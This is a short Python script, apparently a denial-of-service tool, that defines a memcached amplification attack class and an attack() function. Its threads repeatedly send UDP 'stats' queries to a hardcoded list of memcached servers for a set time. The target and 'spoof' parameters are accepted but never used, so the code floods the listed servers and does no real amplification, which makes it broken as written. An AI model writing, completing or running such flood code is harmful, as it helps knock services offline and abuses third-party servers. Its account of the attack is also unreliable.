import socket
import threading
import time

# Fallback jika file tidak dipakai
MEMCACHED_SERVERS = [
    "192.168.254.235",
    "192.168.254.236",
    "192.168.254.237",
    "192.168.254.238",
    "192.168.254.239",
    "192.168.254.240",
    "192.168.254.241",
    "192.168.254.242",
    "192.168.254.243",
    "192.168.254.244",
    "192.168.254.245",
    "192.168.254.246",
    "192.168.254.247",
    "192.168.254.248",
    "192.168.254.249",
    "192.168.254.250",
]

class MemcachedAmplification:
    def __init__(self, target, port, threads, duration, spoof=False, server_list=None):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()
        self.server_list = server_list if server_list else MEMCACHED_SERVERS

    def _send_memcached(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        while not self.stop_event.is_set():
            for server in self.server_list:
                try:
                    sock.sendto(query, (server, 11211))
                except Exception:
                    pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_memcached)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False, server_list=None):
    flood = MemcachedAmplification(target, port, threads, duration, spoof, server_list)
    flood.start()
